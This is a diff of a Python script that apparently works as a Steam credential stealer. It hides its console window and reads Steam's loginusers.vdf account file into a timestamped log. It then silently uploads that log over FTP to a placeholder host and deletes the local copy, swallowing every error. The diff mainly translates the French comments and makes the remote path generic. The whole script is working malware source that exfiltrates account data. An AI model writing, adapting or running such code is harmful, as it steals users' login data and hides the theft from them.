@@ -4,25 +4,24 @@ import sys
 from ftplib import FTP
 from datetime import datetime
 
-# Masquer la console sur Windows
+# Hide console on Windows
 if sys.platform == 'win32':
     import ctypes
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# Configuration FTP
+# FTP configuration
 FTP_HOST = "ftp.example.com"
 FTP_USER = "votre_utilisateur"
 FTP_PASS = "votre_mot_de_passe"
 FTP_PORT = 21
-FTP_REMOTE_DIR = "/htdocs/Login"
+FTP_REMOTE_DIR = "Your/path"
 
 config_path = r'C:\Program Files (x86)\steam\config\loginusers.vdf'
 
-# Créer un nom de fichier unique avec date et heure
+# Create a unique name 
 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 filename = f"steam_log_{timestamp}.txt"
 
-# Créer le fichier en mode silencieux
 with open(filename, 'w', encoding='utf-8') as output_file:
     if os.path.exists(config_path):
         try:
@@ -52,7 +51,7 @@ with open(filename, 'w', encoding='utf-8') as output_file:
         except:
             pass
 
-# Upload FTP silencieux
+# Upload FTP
 try:
     ftp = FTP()
     ftp.connect(FTP_HOST, FTP_PORT, timeout=10)
@@ -75,8 +74,9 @@ try:
 except:
     pass
 
-# Optionnel : supprimer le fichier local après upload
+# Optional: Delete the local file after uploading
 try:
     os.remove(filename)
 except:
     pass
+
